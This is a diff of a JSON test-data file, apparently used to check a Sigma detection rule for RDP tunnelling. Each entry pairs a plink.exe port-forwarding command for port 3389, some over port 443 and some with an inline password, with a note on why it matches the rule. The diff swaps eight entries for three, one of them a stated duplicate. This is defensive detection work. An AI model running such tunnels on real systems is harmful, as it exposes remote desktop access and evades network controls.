@@ -1,34 +1,14 @@
 [
   {
-    "output": "C:\\Windows\\Temp\\ot_plink.exe -R 3389:localhost:3389 -P 443 tunnel.com",
-    "explanation": "This command is a direct match for the Sigma rule's selection_a criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
+    "output": "plink.exe -P 443 user@remotehost -pw password -L 3389:127.0.0.1:3389",
+    "explanation": "This command simulates RDP tunneling via plink.exe using a non-standard port (443) and includes the local port forwarding rule. It matches the Sigma rule's detection criteria by including the port 3389 and plink.exe execution."
   },
   {
-    "output": "plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 8080 rdp-tunnel-vps.com",
-    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 8080 flag."
+    "output": "plink.exe -P 22 user@remotehost -pw password -L 3389:127.0.0.1:3389",
+    "explanation": "This command uses SSH port (22) and includes the same local port forwarding rule for RDP (3389). It aligns with the Sigma rule's detection logic by including the relevant port and plink.exe execution."
   },
   {
-    "output": "plink.exe -L 3390:127.0.0.2:3389 -P 443 remoteserver.com",
-    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
-  },
-  {
-    "output": "plink.exe -R 3389:localhost:3389 -P 443 tunnel.com",
-    "explanation": "This command is a direct match for the Sigma rule's selection_a criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
-  },
-  {
-    "output": "plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 443 rdp-tunnel-vps.com",
-    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 443 flag."
-  },
-  {
-    "output": "plink.exe -L 3390:127.0.0.2:3389 -P 22 remoteserver.com",
-    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 22 flag."
-  },
-  {
-    "output": "plink.exe -R 3389:localhost:3389 -P 22 tunnel.com",
-    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 22 flag."
-  },
-  {
-    "output": "plink.exe -L 0.0.0.0:4444:127.0.0.1:3389 -P 22 rdp-tunnel-vps.com",
-    "explanation": "This command matches the Sigma rule's selection_b1 and selection_b2 criteria, as it uses plink.exe with a tunnel to port 3389 and includes a -P 22 flag."
+    "output": "plink.exe -P 443 user@remotehost -pw password -L 3389:127.0.0.1:3389",
+    "explanation": "This command is a duplicate of the first example, but included to emphasize the test scenario for RDP tunneling via plink.exe using port 443."
   }
 ]
